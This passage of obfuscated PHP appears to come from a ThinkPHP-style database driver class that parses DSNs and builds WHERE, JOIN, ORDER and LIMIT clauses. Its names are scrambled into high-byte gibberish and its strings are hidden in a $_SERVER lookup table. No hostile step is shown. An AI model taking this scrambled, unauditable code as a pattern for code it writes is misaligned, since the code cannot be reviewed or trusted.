$this->_getDsnType($EóÂÈİ¯éÖ[$fäÕÊ¥´’†[825]]); } } else { think_exception(think_lang($fäÕÊ¥´’†[876]) . $fäÕÊ¥´’†[877] . $Aê‚½Û´›Ş); } goto bÌ‰˜Ï ¤÷; f¸‚ŸİŒÖğ: } public function __call($Dƒ ³Ê™±Ö, $D¿…—ôâ¨´) { if (method_exists($this, $Dƒ ³Ê™±Ö)) { return call_user_func_array(array($this, $Dƒ ³Ê™±Ö), $D¿…—ôâ¨´); } } protected function _getDsnType($cááè™†‘ø) { $fÔõÙóƒ¦â = explode($_SERVER[Å¸ş][4], $cááè™†‘ø); $eğ…˜¦‰—³ = strtoupper(trim($fÔõÙóƒ¦â[0])); return $eğ…˜¦‰—³; } private function parseConfig($f¬Ğ·åÚ‘ò = '') { $CÓË³‚öĞ =& $_SERVER[Å¸ş]; if (!empty($f¬Ğ·åÚ‘ò) && is_string($f¬Ğ·åÚ‘ò)) { $f¬Ğ·åÚ‘ò = $this->parseDSN($f¬Ğ·åÚ‘ò); } elseif (is_array($f¬Ğ·åÚ‘ò)) { $f¬Ğ·åÚ‘ò = array_change_key_case($f¬Ğ·åÚ‘ò); $f¬Ğ·åÚ‘ò = array($CÓË³‚öĞ[873] => $f¬Ğ·åÚ‘ò[$CÓË³‚öĞ[725]], $CÓË³‚öĞ[798] => $f¬Ğ·åÚ‘ò[$CÓË³‚öĞ[878]], $CÓË³‚öĞ[799] => $f¬Ğ·åÚ‘ò[$CÓË³‚öĞ[879]], $CÓË³‚öĞ[796] => $f¬Ğ·åÚ‘ò[$CÓË³‚öĞ[880]], $CÓË³‚öĞ[797] => $f¬Ğ·åÚ‘ò[$CÓË³‚öĞ[881]], $CÓË³‚öĞ[17] => $f¬Ğ·åÚ‘ò[$CÓË³‚öĞ[882]], $CÓË³‚öĞ[825] => $f¬Ğ·åÚ‘ò[$CÓË³‚öĞ[727]], $CÓË³‚öĞ[13] => isset($f¬Ğ·åÚ‘ò[$CÓË³‚öĞ[883]]) ? $f¬Ğ·åÚ‘ò[$CÓË³‚öĞ[883]] : array()); } elseif (empty($f¬Ğ·åÚ‘ò)) { if (think_config($CÓË³‚öĞ[884]) && $CÓË³‚öĞ[726] != strtolower(think_config($CÓË³‚öĞ[885]))) { $f¬Ğ·åÚ‘ò = $this->parseDSN(think_config($CÓË³‚öĞ[884])); } else { $f¬Ğ·åÚ‘ò = array($CÓË³‚öĞ[873] => think_config($CÓË³‚öĞ[885]), $CÓË³‚öĞ[798] => think_config($CÓË³‚öĞ[886]), $CÓË³‚öĞ[799] => think_config($CÓË³‚öĞ[887]), $CÓË³‚öĞ[796] => think_config($CÓË³‚öĞ[888]), $CÓË³‚öĞ[797] => think_config($CÓË³‚öĞ[889]), $CÓË³‚öĞ[17] => think_config($CÓË³‚öĞ[234]), $CÓË³‚öĞ[825] => think_config($CÓË³‚öĞ[884]), $CÓË³‚öĞ[13] => think_config($CÓË³‚öĞ[890])); } } return $f¬Ğ·åÚ‘ò; } protected function initConnect($Bµ©ŠÅ”İ¬ = true) { if (1 == think_config($_SERVER[Å¸ş][18])) { $this->_linkID = $this->multiConnect($Bµ©ŠÅ”İ¬); } else { if (!$this->connected) { $this->_linkID = $this->connect(); } } } protected function multiConnect($f™±Ÿ‚ÀÒç = false) { $cà½ó¹¡›Ï =& $_SERVER[Å¸ş]; static $F­Æ™ èß = array(); if (empty($F­Æ™ èß)) { foreach ($this->config as $C¥‘Û„ØÎí => $a®‘¯œÂ¥©) { $F­Æ™ èß[$C¥‘Û„ØÎí] = explode($cà½ó¹¡›Ï[47], $a®‘¯œÂ¥©); } } if (think_config($cà½ó¹¡›Ï[891])) { if ($f™±Ÿ‚ÀÒç) { $B¾®Ş÷–‹ = floor(mt_rand(0, think_config($cà½ó¹¡›Ï[892]) - 1)); } else { if (is_numeric(think_config($cà½ó¹¡›Ï[893]))) { $B¾®Ş÷–‹ = think_config($cà½ó¹¡›Ï[893]); } else { $B¾®Ş÷–‹ = floor(mt_rand(think_config($cà½ó¹¡›Ï[892]), count($F­Æ™ èß[$cà½ó¹¡›Ï[796]]) - 1)); } } } else { $B¾®Ş÷–‹ = floor(mt_rand(0, count($F­Æ™ èß[$cà½ó¹¡›Ï[796]]) - 1)); } $Fƒ…“§òš = array($cà½ó¹¡›Ï[798] => isset($F­Æ™ èß[$cà½ó¹¡›Ï[798]][$B¾®Ş÷–‹]) ? $F­Æ™ èß[$cà½ó¹¡›Ï[798]][$B¾®Ş÷–‹] : $F­Æ™ èß[$cà½ó¹¡›Ï[798]][0], $cà½ó¹¡›Ï[799] => isset($F­Æ™ èß[$cà½ó¹¡›Ï[799]][$B¾®Ş÷–‹]) ? $F­Æ™ èß[$cà½ó¹¡›Ï[799]][$B¾®Ş÷–‹] : $F­Æ™ èß[$cà½ó¹¡›Ï[799]][0], $cà½ó¹¡›Ï[796] => isset($F­Æ™ èß[$cà½ó¹¡›Ï[796]][$B¾®Ş÷–‹]) ? $F­Æ™ èß[$cà½ó¹¡›Ï[796]][$B¾®Ş÷–‹] : $F­Æ™ èß[$cà½ó¹¡›Ï[796]][0], $cà½ó¹¡›Ï[797] => isset($F­Æ™ èß[$cà½ó¹¡›Ï[797]][$B¾®Ş÷–‹]) ? $F­Æ™ èß[$cà½ó¹¡›Ï[797]][$B¾®Ş÷–‹] : $F­Æ™ èß[$cà½ó¹¡›Ï[797]][0], $cà½ó¹¡›Ï[17] => isset($F­Æ™ èß[$cà½ó¹¡›Ï[17]][$B¾®Ş÷–‹]) ? $F­Æ™ èß[$cà½ó¹¡›Ï[17]][$B¾®Ş÷–‹] : $F­Æ™ èß[$cà½ó¹¡›Ï[17]][0], $cà½ó¹¡›Ï[825] => isset($F­Æ™ èß[$cà½ó¹¡›Ï[825]][$B¾®Ş÷–‹]) ? $F­Æ™ èß[$cà½ó¹¡›Ï[825]][$B¾®Ş÷–‹] : $F­Æ™ èß[$cà½ó¹¡›Ï[825]][0], $cà½ó¹¡›Ï[13] => isset($F­Æ™ èß[$cà½ó¹¡›Ï[13]][$B¾®Ş÷–‹]) ? $F­Æ™ èß[$cà½ó¹¡›Ï[13]][$B¾®Ş÷–‹] : $F­Æ™ èß[$cà½ó¹¡›Ï[13]][0]); return $this->connect($Fƒ…“§òš, $B¾®Ş÷–‹); } public function parseDSN($A®ïÒÓÑÁê) { $F ŞÆ ¹ =& $_SERVER[Å¸ş]; if (empty($A®ïÒÓÑÁê)) { return !1; } $BÔÏñêØÖÄ = parse_url($A®ïÒÓÑÁê); if ($BÔÏñêØÖÄ[$F ŞÆ ¹[168]]) { $b¦À‰âœ = array($F ŞÆ ¹[873] => $BÔÏñêØÖÄ[$F ŞÆ ¹[168]], $F ŞÆ ¹[798] => isset($BÔÏñêØÖÄ[$F ŞÆ ¹[537]]) ? $BÔÏñêØÖÄ[$F ŞÆ ¹[537]] : $F ŞÆ ¹[33], $F ŞÆ ¹[799] => isset($BÔÏñêØÖÄ[$F ŞÆ ¹[894]]) ? $BÔÏñêØÖÄ[$F ŞÆ ¹[894]] : $F ŞÆ ¹[33], $F ŞÆ ¹[796] => isset($BÔÏñêØÖÄ[$F ŞÆ ¹[169]]) ? $BÔÏñêØÖÄ[$F ŞÆ ¹[169]] : $F ŞÆ ¹[33], $F ŞÆ ¹[797] => isset($BÔÏñêØÖÄ[$F ŞÆ ¹[170]]) ? $BÔÏñêØÖÄ[$F ŞÆ ¹[170]] : $F ŞÆ ¹[33], $F ŞÆ ¹[17] => isset($BÔÏñêØÖÄ[$F ŞÆ ¹[75]]) ? substr($BÔÏñêØÖÄ[$F ŞÆ ¹[75]], 1) : $F ŞÆ ¹[33]); } else { preg_match($F ŞÆ ¹[895], trim($A®ïÒÓÑÁê), $AË¬Ç¡è÷è); $b¦À‰âœ = array($F ŞÆ ¹[873] => $AË¬Ç¡è÷è[1], $F ŞÆ ¹[798] => $AË¬Ç¡è÷è[2], $F ŞÆ ¹[799] => $AË¬Ç¡è÷è[3], $F ŞÆ ¹[796] => $AË¬Ç¡è÷è[4], $F ŞÆ ¹[797] => $AË¬Ç¡è÷è[5], $F ŞÆ ¹[17] => $AË¬Ç¡è÷è[6]); } $b¦À‰âœ[$F ŞÆ ¹[825]] = $F ŞÆ ¹[33]; return $b¦À‰âœ; } protected function debug() { $BÇŞàÁ®ó =& $_SERVER[Å¸ş]; $this->modelSql[$this->model] = $this->queryStr; $this->model = $BÇŞàÁ®ó[896]; if (think_config($BÇŞàÁ®ó[897])) { think_status($BÇŞàÁ®ó[898]); think_trace($this->queryStr . $BÇŞàÁ®ó[899] . think_status($BÇŞàÁ®ó[20], $BÇŞàÁ®ó[898], 6) . $BÇŞàÁ®ó[900], $BÇŞàÁ®ó[33], $BÇŞàÁ®ó[901]); } } protected function parseLock($f¾†»êòª = false) { $FÂ±¿©ƒÙ¯ =& $_SERVER[Å¸ş]; if (!$f¾†»êòª) { return $FÂ±¿©ƒÙ¯[33]; } if ($FÂ±¿©ƒÙ¯[827] == $this->dbType) { return $FÂ±¿©ƒÙ¯[902]; } return $FÂ±¿©ƒÙ¯[903]; } protected function parseSet($EøÔòĞ¢ã¸) { $fËÒİ’Ôôß =& $_SERVER[Å¸ş]; foreach ($EøÔòĞ¢ã¸ as $fŞÛÆˆ => $c¿„Ç‰À·…) { if (is_array($c¿„Ç‰À·…) && $fËÒİ’Ôôß[285] == $c¿„Ç‰À·…[0]) { $cóí¯åù[] = $this->parseKey($fŞÛÆˆ) . $fËÒİ’Ôôß[904] . $c¿„Ç‰À·…[1]; } elseif (is_scalar($c¿„Ç‰À·…) || is_null($c¿„Ç‰À·…)) { $cóí¯åù[] = $this->parseKey($fŞÛÆˆ) . $fËÒİ’Ôôß[904] . $this->parseValue($c¿„Ç‰À·…); } } return $fËÒİ’Ôôß[905] . implode($fËÒİ’Ôôß[47], $cóí¯åù); } protected function bindParam($Bî½†ªÄ–², $F»‘ßÕ‡™) { $this->bind[$_SERVER[Å¸ş][4] . $Bî½†ªÄ–²] = $F»‘ßÕ‡™; } protected function parseBind($EÜ”æÅæíó) { $EÜ”æÅæíó = array_merge($this->bind, $EÜ”æÅæíó); $this->bind = array(); return $EÜ”æÅæíó; } function parseKey(&$EÎÈœÄğğÕ, $cƒ ¥»÷Ú = true) { if ($cƒ ¥»÷Ú) { $EÎÈœÄğğÕ = $this->parseKeyCheck($EÎÈœÄğğÕ); } return $EÎÈœÄğğÕ; } function parseKeyCheck($BÙœ‹¼½³³) { $c‡õÆ†ô‘ğ =& $_SERVER[Å¸ş]; $BÙœ‹¼½³³ = trim($BÙœ‹¼½³³); if (!preg_match($c‡õÆ†ô‘ğ[906], $BÙœ‹¼½³³)) { think_exception($c‡õÆ†ô‘ğ[907] . $BÙœ‹¼½³³); } return $BÙœ‹¼½³³; } protected function parseValue($C‘¢İùæ÷) { $cá‚ããÒ–Ã =& $_SERVER[Å¸ş]; if (is_string($C‘¢İùæ÷)) { $C‘¢İùæ÷ = $cá‚ããÒ–Ã[866] . $this->escapeString($C‘¢İùæ÷) . $cá‚ããÒ–Ã[866]; } elseif (isset($C‘¢İùæ÷[0]) && is_string($C‘¢İùæ÷[0]) && strtolower($C‘¢İùæ÷[0]) == $cá‚ããÒ–Ã[285]) { $C‘¢İùæ÷ = $this->escapeString($C‘¢İùæ÷[1]); } elseif (is_array($C‘¢İùæ÷)) { $C‘¢İùæ÷ = array_map(array($this, $cá‚ããÒ–Ã[867]), $C‘¢İùæ÷); } elseif (is_bool($C‘¢İùæ÷)) { $C‘¢İùæ÷ = $C‘¢İùæ÷ ? $cá‚ããÒ–Ã[83] : $cá‚ããÒ–Ã[470]; } elseif (is_null($C‘¢İùæ÷)) { $C‘¢İùæ÷ = $cá‚ããÒ–Ã[99]; } return $C‘¢İùæ÷; } protected function parseField($d¤ó‹Üß‹œ) { $C£ „ÊÛì =& $_SERVER[Å¸ş]; if (is_string($d¤ó‹Üß‹œ) && strpos($d¤ó‹Üß‹œ, $C£ „ÊÛì[47])) { $d¤ó‹Üß‹œ = explode($C£ „ÊÛì[47], $d¤ó‹Üß‹œ); } if (is_array($d¤ó‹Üß‹œ)) { $a¸†Ë˜‰¢ = array(); foreach ($d¤ó‹Üß‹œ as $fÊ”‰÷´ğ => $AÃÛÑÁ•ª) { if (!is_numeric($fÊ”‰÷´ğ)) { $a¸†Ë˜‰¢[] = $this->parseKey($fÊ”‰÷´ğ) . $C£ „ÊÛì[908] . $this->parseKey($AÃÛÑÁ•ª); } else { $a¸†Ë˜‰¢[] = $this->parseKey($AÃÛÑÁ•ª); } } $e…£óàê¤œ = implode($C£ „ÊÛì[47], $a¸†Ë˜‰¢); } elseif (is_string($d¤ó‹Üß‹œ) && !empty($d¤ó‹Üß‹œ)) { $e…£óàê¤œ = $d¤ó‹Üß‹œ; } else { $e…£óàê¤œ = $C£ „ÊÛì[176]; } return $e…£óàê¤œ; } protected function parseTable($BøºÅ¢¥’µ) { $eªòÊ³ÄŒ =& $_SERVER[Å¸ş]; if (is_array($BøºÅ¢¥’µ)) { $BÍÆØö† = array(); foreach ($BøºÅ¢¥’µ as $dµ§±–‘ˆî => $a‚Ÿ¦ø½ÜŒ) { if (!is_numeric($dµ§±–‘ˆî)) { $BÍÆØö†[] = $this->parseKey($dµ§±–‘ˆî) . $eªòÊ³ÄŒ[50] . $this->parseKey($a‚Ÿ¦ø½ÜŒ); } else { $BÍÆØö†[] = $this->parseKey($dµ§±–‘ˆî); } } $BøºÅ¢¥’µ = $BÍÆØö†; } elseif (is_string($BøºÅ¢¥’µ)) { if (strstr($BøºÅ¢¥’µ, $eªòÊ³ÄŒ[50])) { return $BøºÅ¢¥’µ; } $BøºÅ¢¥’µ = explode($eªòÊ³ÄŒ[47], $BøºÅ¢¥’µ); array_walk($BøºÅ¢¥’µ, array($this, $eªòÊ³ÄŒ[815])); } return $eªòÊ³ÄŒ[909] . trim(implode($eªòÊ³ÄŒ[910], $BøºÅ¢¥’µ), $eªòÊ³ÄŒ[821]) . $eªòÊ³ÄŒ[909]; } protected function parseWhere($b¢·”İùøÛ) { $AÙÊ©œÈÏ =& $_SERVER[Å¸ş]; $eÜ“˜´ñ‡‡ = $AÙÊ©œÈÏ[33]; if (is_string($b¢·”İùøÛ)) { $eÜ“˜´ñ‡‡ = $b¢·”İùøÛ; } else { $CÃàŒêÊí„ = isset($b¢·”İùøÛ[$AÙÊ©œÈÏ[911]]) ? strtoupper($b¢·”İùøÛ[$AÙÊ©œÈÏ[911]]) : $AÙÊ©œÈÏ[33]; if (in_array($CÃàŒêÊí„, array($AÙÊ©œÈÏ[912], $AÙÊ©œÈÏ[913], $AÙÊ©œÈÏ[914]))) { $CÃàŒêÊí„ = $AÙÊ©œÈÏ[50] . $CÃàŒêÊí„ . $AÙÊ©œÈÏ[50]; unset($b¢·”İùøÛ[$AÙÊ©œÈÏ[911]]); } else { $CÃàŒêÊí„ = $AÙÊ©œÈÏ[915]; } foreach ($b¢·”İùøÛ as $D¬ø‚ïƒœ‘ => $eÄšÎõîæ) { $eÜ“˜´ñ‡‡ .= $AÙÊ©œÈÏ[265]; if (is_numeric($D¬ø‚ïƒœ‘)) { $D¬ø‚ïƒœ‘ = $AÙÊ©œÈÏ[916]; } if (0 === strpos($D¬ø‚ïƒœ‘, $AÙÊ©œÈÏ[70])) { $eÜ“˜´ñ‡‡ .= $this->parseThinkWhere($D¬ø‚ïƒœ‘, $eÄšÎõîæ); } else { if (!preg_match($AÙÊ©œÈÏ[917], trim($D¬ø‚ïƒœ‘))) { think_exception(think_lang($AÙÊ©œÈÏ[918]) . $AÙÊ©œÈÏ[4] . $D¬ø‚ïƒœ‘); } $Bê¸Á¯æø¼ = is_array($eÄšÎõîæ) && isset($eÄšÎõîæ[$AÙÊ©œÈÏ[919]]); $D¬ø‚ïƒœ‘ = trim($D¬ø‚ïƒœ‘); if (strpos($D¬ø‚ïƒœ‘, $AÙÊ©œÈÏ[271])) { $C¢ğÊ‹” = explode($AÙÊ©œÈÏ[271], $D¬ø‚ïƒœ‘); $Bˆ¸·„ÔÒ = array(); foreach ($C¢ğÊ‹” as $AŞÁ‚³„É => $DÉ•¡Ñë©Ü) { $B¦µ¨™Š˜¾ = $Bê¸Á¯æø¼ ? $eÄšÎõîæ[$AŞÁ‚³„É] : $eÄšÎõîæ; $Bˆ¸·„ÔÒ[] = $AÙÊ©œÈÏ[248] . $this->parseWhereItem($this->parseKey($DÉ•¡Ñë©Ü), $B¦µ¨™Š˜¾) . $AÙÊ©œÈÏ[814]; } $eÜ“˜´ñ‡‡ .= implode($AÙÊ©œÈÏ[920], $Bˆ¸·„ÔÒ); } elseif (strpos($D¬ø‚ïƒœ‘, $AÙÊ©œÈÏ[272])) { $C¢ğÊ‹” = explode($AÙÊ©œÈÏ[272], $D¬ø‚ïƒœ‘); $Bˆ¸·„ÔÒ = array(); foreach ($C¢ğÊ‹” as $AŞÁ‚³„É => $DÉ•¡Ñë©Ü) { $B¦µ¨™Š˜¾ = $Bê¸Á¯æø¼ ? $eÄšÎõîæ[$AŞÁ‚³„É] : $eÄšÎõîæ; $Bˆ¸·„ÔÒ[] = $AÙÊ©œÈÏ[248] . $this->parseWhereItem($this->parseKey($DÉ•¡Ñë©Ü), $B¦µ¨™Š˜¾) . $AÙÊ©œÈÏ[814]; } $eÜ“˜´ñ‡‡ .= implode($AÙÊ©œÈÏ[915], $Bˆ¸·„ÔÒ); } else { $eÜ“˜´ñ‡‡ .= $this->parseWhereItem($this->parseKey($D¬ø‚ïƒœ‘), $eÄšÎõîæ); } } $eÜ“˜´ñ‡‡ .= $AÙÊ©œÈÏ[266] . $CÃàŒêÊí„; } $eÜ“˜´ñ‡‡ = substr($eÜ“˜´ñ‡‡, 0, -strlen($CÃàŒêÊí„)); } return empty($eÜ“˜´ñ‡‡) ? $AÙÊ©œÈÏ[33] : $AÙÊ©œÈÏ[921] . $eÜ“˜´ñ‡‡; } protected function parseWhereItem($fª‡Œ…°ÕÕ, $cà†ê„Ì¯§) { $Cõ¦˜É°ê¬ =& $_SERVER[Å¸ş]; $a¾†ÚÇÓ‹© = $Cõ¦˜É°ê¬[33]; if (is_array($cà†ê„Ì¯§)) { if (is_string($cà†ê„Ì¯§[0])) { $føïë¬¯œ» = strtolower($cà†ê„Ì¯§[0]); if (in_array($cà†ê„Ì¯§[0], array($Cõ¦˜É°ê¬[904], $Cõ¦˜É°ê¬[922], $Cõ¦˜É°ê¬[923], $Cõ¦˜É°ê¬[924], $Cõ¦˜É°ê¬[925], $Cõ¦˜É°ê¬[926]))) { $a¾†ÚÇÓ‹© .= $fª‡Œ…°ÕÕ . $Cõ¦˜É°ê¬[50] . $cà†ê„Ì¯§[0] . $Cõ¦˜É°ê¬[50] . $this->parseValue($cà†ê„Ì¯§[1]); } elseif (preg_match($Cõ¦˜É°ê¬[927], $cà†ê„Ì¯§[0])) { $a¾†ÚÇÓ‹© .= $fª‡Œ…°ÕÕ . $Cõ¦˜É°ê¬[50] . $this->exp[$føïë¬¯œ»] . $Cõ¦˜É°ê¬[50] . $this->parseValue($cà†ê„Ì¯§[1]); } elseif (preg_match($Cõ¦˜É°ê¬[928], $cà†ê„Ì¯§[0])) { if (is_array($cà†ê„Ì¯§[1])) { $C¢îÑ¸¹‚ = isset($cà†ê„Ì¯§[2]) ? strtoupper($cà†ê„Ì¯§[2]) : $Cõ¦˜É°ê¬[913]; if (in_array($C¢îÑ¸¹‚, array($Cõ¦˜É°ê¬[912], $Cõ¦˜É°ê¬[913], $Cõ¦˜É°ê¬[914]))) { $f®«¥Óøõõ = array(); foreach ($cà†ê„Ì¯§[1] as $fÙ¤¬¢‡Ô·) { $f®«¥Óøõõ[] = $fª‡Œ…°ÕÕ . $Cõ¦˜É°ê¬[50] . $this->exp[$føïë¬¯œ»] . $Cõ¦˜É°ê¬[50] . $this->parseValue($fÙ¤¬¢‡Ô·); } $a¾†ÚÇÓ‹© .= $Cõ¦˜É°ê¬[248] . implode($Cõ¦˜É°ê¬[50] . $C¢îÑ¸¹‚ . $Cõ¦˜É°ê¬[50], $f®«¥Óøõõ) . $Cõ¦˜É°ê¬[814]; } } else { $a¾†ÚÇÓ‹© .= $fª‡Œ…°ÕÕ . $Cõ¦˜É°ê¬[50] . $this->exp[$føïë¬¯œ»] . $Cõ¦˜É°ê¬[50] . $this->parseValue($cà†ê„Ì¯§[1]); } } elseif ($Cõ¦˜É°ê¬[285] == $føïë¬¯œ») { $a¾†ÚÇÓ‹© .= $Cõ¦˜É°ê¬[812] . $fª‡Œ…°ÕÕ . $Cõ¦˜É°ê¬[50] . $cà†ê„Ì¯§[1] . $Cõ¦˜É°ê¬[929]; } elseif (preg_match($Cõ¦˜É°ê¬[930], $cà†ê„Ì¯§[0])) { if (isset($cà†ê„Ì¯§[2]) && $Cõ¦˜É°ê¬[285] == $cà†ê„Ì¯§[2]) { $a¾†ÚÇÓ‹© .= $fª‡Œ…°ÕÕ . $Cõ¦˜É°ê¬[50] . $this->exp[$føïë¬¯œ»] . $Cõ¦˜É°ê¬[50] . $cà†ê„Ì¯§[1]; } else { if (is_string($cà†ê„Ì¯§[1])) { $cà†ê„Ì¯§[1] = explode($Cõ¦˜É°ê¬[47], $cà†ê„Ì¯§[1]); } $B“¨—êª‰ = implode($Cõ¦˜É°ê¬[47], $this->parseValue($cà†ê„Ì¯§[1])); $a¾†ÚÇÓ‹© .= $fª‡Œ…°ÕÕ . $Cõ¦˜É°ê¬[50] . $this->exp[$føïë¬¯œ»] . $Cõ¦˜É°ê¬[812] . $B“¨—êª‰ . $Cõ¦˜É°ê¬[814]; } } elseif (preg_match($Cõ¦˜É°ê¬[931], $cà†ê„Ì¯§[0])) { $cï²ˆÙ­ = is_string($cà†ê„Ì¯§[1]) ? explode($Cõ¦˜É°ê¬[47], $cà†ê„Ì¯§[1]) : $cà†ê„Ì¯§[1]; $a¾†ÚÇÓ‹© .= $Cõ¦˜É°ê¬[812] . $fª‡Œ…°ÕÕ . $Cõ¦˜É°ê¬[50] . $this->exp[$føïë¬¯œ»] . $Cõ¦˜É°ê¬[50] . $this->parseValue($cï²ˆÙ­[0]) . $Cõ¦˜É°ê¬[915] . $this->parseValue($cï²ˆÙ­[1]) . $Cõ¦˜É°ê¬[266]; } else { think_exception(think_lang($Cõ¦˜É°ê¬[918]) . $Cõ¦˜É°ê¬[4] . $cà†ê„Ì¯§[0]); } } else { $CÌ…¾éì = count($cà†ê„Ì¯§); $CÄùŸÁÁ¡ß = isset($cà†ê„Ì¯§[$CÌ…¾éì - 1]) ? strtoupper($cà†ê„Ì¯§[$CÌ…¾éì - 1]) : $Cõ¦˜É°ê¬[33]; if (in_array($CÄùŸÁÁ¡ß, array($Cõ¦˜É°ê¬[912], $Cõ¦˜É°ê¬[913], $Cõ¦˜É°ê¬[914]))) { $CÌ…¾éì = $CÌ…¾éì - 1; } else { $CÄùŸÁÁ¡ß = $Cõ¦˜É°ê¬[912]; } for ($dÈ´Œ¡äÆÛ = 0; $dÈ´Œ¡äÆÛ < $CÌ…¾éì; $dÈ´Œ¡äÆÛ++) { $cï²ˆÙ­ = is_array($cà†ê„Ì¯§[$dÈ´Œ¡äÆÛ]) ? $cà†ê„Ì¯§[$dÈ´Œ¡äÆÛ][1] : $cà†ê„Ì¯§[$dÈ´Œ¡äÆÛ]; if ($Cõ¦˜É°ê¬[285] == strtolower($cà†ê„Ì¯§[$dÈ´Œ¡äÆÛ][0])) { $a¾†ÚÇÓ‹© .= $Cõ¦˜É°ê¬[248] . $fª‡Œ…°ÕÕ . $Cõ¦˜É°ê¬[50] . $cï²ˆÙ­ . $Cõ¦˜É°ê¬[929] . $CÄùŸÁÁ¡ß . $Cõ¦˜É°ê¬[50]; } else { $cÀ×Š¾ãã = is_array($cà†ê„Ì¯§[$dÈ´Œ¡äÆÛ]) ? $this->exp[strtolower($cà†ê„Ì¯§[$dÈ´Œ¡äÆÛ][0])] : $Cõ¦˜É°ê¬[904]; if (!$cÀ×Š¾ãã && is_array($cà†ê„Ì¯§[$dÈ´Œ¡äÆÛ]) && in_array($cà†ê„Ì¯§[$dÈ´Œ¡äÆÛ][0], array($Cõ¦˜É°ê¬[904], $Cõ¦˜É°ê¬[922], $Cõ¦˜É°ê¬[923], $Cõ¦˜É°ê¬[924], $Cõ¦˜É°ê¬[925], $Cõ¦˜É°ê¬[926]))) { $cÀ×Š¾ãã = $cà†ê„Ì¯§[$dÈ´Œ¡äÆÛ][0]; } $a¾†ÚÇÓ‹© .= $Cõ¦˜É°ê¬[248] . $fª‡Œ…°ÕÕ . $Cõ¦˜É°ê¬[50] . $cÀ×Š¾ãã . $Cõ¦˜É°ê¬[50] . $this->parseValue($cï²ˆÙ­) . $Cõ¦˜É°ê¬[929] . $CÄùŸÁÁ¡ß . $Cõ¦˜É°ê¬[50]; } } $a¾†ÚÇÓ‹© = substr($a¾†ÚÇÓ‹©, 0, -4); } } else { $a¾†ÚÇÓ‹© .= $fª‡Œ…°ÕÕ . $Cõ¦˜É°ê¬[932] . $this->parseValue($cà†ê„Ì¯§); } return $a¾†ÚÇÓ‹©; } protected function parseThinkWhere($d”’ã¨Ä¤, $a¹ÉØñ) { $fàÔ‚ê—¬ =& $_SERVER[Å¸ş]; $D¨ÇëáİÚ = $fàÔ‚ê—¬[33]; switch ($d”’ã¨Ä¤) { case $fàÔ‚ê—¬[339]: $D¨ÇëáİÚ = $a¹ÉØñ; break; case $fàÔ‚ê—¬[916]: $D¨ÇëáİÚ = is_string($a¹ÉØñ) ? $a¹ÉØñ : substr($this->parseWhere($a¹ÉØñ), 6); break; case $fàÔ‚ê—¬[933]: parse_str($a¹ÉØñ, $F•Í—ÏŒ¢‚); if (isset($F•Í—ÏŒ¢‚[$fàÔ‚ê—¬[911]])) { $dèµ´Š–Ï = $fàÔ‚ê—¬[50] . strtoupper($F•Í—ÏŒ¢‚[$fàÔ‚ê—¬[911]]) . $fàÔ‚ê—¬[50]; unset($F•Í—ÏŒ¢‚[$fàÔ‚ê—¬[911]]); } else { $dèµ´Š–Ï = $fàÔ‚ê—¬[915]; } $EŒÌêñŠø¹ = array(); foreach ($F•Í—ÏŒ¢‚ as $Døğµ‚‰Ş => $fÖ‰ÚÎ‘ÜÚ) { $EŒÌêñŠø¹[] = $this->parseKey($Døğµ‚‰Ş) . $fàÔ‚ê—¬[932] . $this->parseValue($fÖ‰ÚÎ‘ÜÚ); } $D¨ÇëáİÚ = implode($dèµ´Š–Ï, $EŒÌêñŠø¹); break; } return $D¨ÇëáİÚ; } protected function parseLimit($B²èôåŒå¨) { $D…«¨íœöÏ =& $_SERVER[Å¸ş]; return !empty($B²èôåŒå¨) ? $D…«¨íœöÏ[48] . $B²èôåŒå¨ . $D…«¨íœöÏ[50] : $D…«¨íœöÏ[33]; } protected function parseJoin($bÆÅ”æÎŞß) { $cÕ…ªÕÖî =& $_SERVER[Å¸ş]; $a®„¦»œâ = $cÕ…ªÕÖî[33]; if (!empty($bÆÅ”æÎŞß)) { if (is_array($bÆÅ”æÎŞß)) { foreach ($bÆÅ”æÎŞß as $e±Í˜ÓØôë => $aöêÁ«–Ğ) { if (!1 !== stripos($aöêÁ«–Ğ, $cÕ…ªÕÖî[934])) { $a®„¦»œâ .= $cÕ…ªÕÖî[50] . $aöêÁ«–Ğ; } else { $a®„¦»œâ .= $cÕ…ªÕÖî[935] . $aöêÁ«–Ğ; } } } else { $a®„¦»œâ .= $cÕ…ªÕÖî[935] . $bÆÅ”æÎŞß; } } $a®„¦»œâ = preg_replace($cÕ…ªÕÖî[936], think_config($cÕ…ªÕÖî[839]) . $cÕ…ªÕÖî[937], $a®„¦»œâ); return $a®„¦»œâ; } protected function parseOrder($dé¤«éŒ—…) { $a‡æ‰‘®ë =& $_SERVER[Å¸ş]; if (is_array($dé¤«éŒ—…)) { $AÈ¬Á¯èØ = array(); foreach ($dé¤«éŒ—… as $c¤ÍÅˆ–Â« => $BÍ…‚ Š«Ë) { if (is_numeric($c¤ÍÅˆ–Â«)) { $AÈ¬Á¯èØ[] = $this->parseKey($BÍ…‚ Š«Ë); } else { $BÍ…‚ Š«Ë = in_array(strtoupper(trim($BÍ…‚ Š«Ë)), array($a‡æ‰‘®ë[938], $a‡æ‰‘®ë[939])) ? $a‡æ‰‘®ë[50] . $BÍ…‚ Š«Ë : $a‡æ‰‘®ë[33]; if (preg_match($a‡æ‰‘®ë[940], $c¤ÍÅˆ–Â«)) { $AÈ¬Á¯èØ[] = $this->parseKey($c¤ÍÅˆ–Â«) . $BÍ…‚ Š«Ë; } else { think_exception($a‡æ‰‘®ë[941] . $c¤ÍÅˆ–Â«); } } } $dé¤«éŒ—… = implode($a‡æ‰‘®ë[47], $AÈ¬Á¯èØ); } return !empty($dé¤«éŒ—…) ? $a‡æ‰‘®ë[942] . $dé¤«éŒ—… : $a‡æ‰‘®ë[33]; } protected function parseGroup($D¬êó†ÑŒ) { $Eé´÷Õ‚…¶ =& $_SERVER[Å¸ş]; return !empty($D¬êó†ÑŒ) ? $Eé´÷Õ‚…¶[943] . $D¬êó†ÑŒ : $Eé´÷Õ‚…¶[33]; } protected function parseHaving($cæ“Äê¢Îö) { $f‚ÓÕÁ„êË =& $_SERVER[Å¸ş]; return !empty($cæ“Äê¢Îö) ? $f‚ÓÕÁ„êË[944] . $cæ“Äê¢Îö : $f‚ÓÕÁ„êË[33]; } protected function parseComment($DÎªÜ…”™è) { $A£”·¨ğ ¸ =& $_SERVER[Å¸ş]; return !empty($DÎªÜ…”™è) ? $A£”·¨ğ ¸[945] . $DÎªÜ…”™è . $A£”·¨ğ ¸[946] : $A£”·¨ğ ¸[33]; } protected function parseDistinct($eÛ§ÅìÚ°) { $eïçÛ Ê«é 